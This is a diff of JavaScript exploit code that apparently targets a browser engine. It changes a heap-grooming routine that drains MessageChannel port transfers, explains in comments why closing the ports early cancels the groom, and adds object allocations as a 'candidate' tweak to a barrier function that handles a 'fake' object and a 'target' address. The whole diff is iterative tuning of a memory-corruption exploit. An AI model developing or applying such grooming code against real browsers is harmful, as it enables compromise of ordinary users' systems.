@@ -1043,8 +1043,9 @@ function runGroomAndLoad() {
         emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
         const channel = new MessageChannel();
         
-        // FIX: Do NOT close the ports before posting. 
-        // Closing them early ignores the transfer list and no-ops the groom.
+        // FIX: Do NOT close the ports here. 
+        // Closing them before postMessage silently ignores the transfer list,
+        // which no-ops the groom and causes ZERO-HEADER-MISS.
         // We will close them after the final postMessage.
 
         for (let i = 0; i < DRAIN_COUNT; ++i)
@@ -1086,7 +1087,6 @@ function runGroomAndLoad() {
         }
 
         // FIX: Now that all transfers are queued, we can safely close the ports.
-        // This ensures the transfer list is processed by the message queue.
         channel.port1.close();
         channel.port2.close();
 
@@ -1117,6 +1117,11 @@ function ensureBarrierNode() {
 }
 
 function defaultCriticalBarrier(fake, target) {
+    // Edit 3: Candidate A - allocate and drop 4 small objects
+    const t = [];
+    for (let i = 0; i < 4; ++i) t.push({});
+    t.length = 0;
+
     emit("BARRIER-FIRED", "fake=" + hex(fake)
         + " target=" + hex(target)
         + " t=" + (typeof performance !== "undefined"
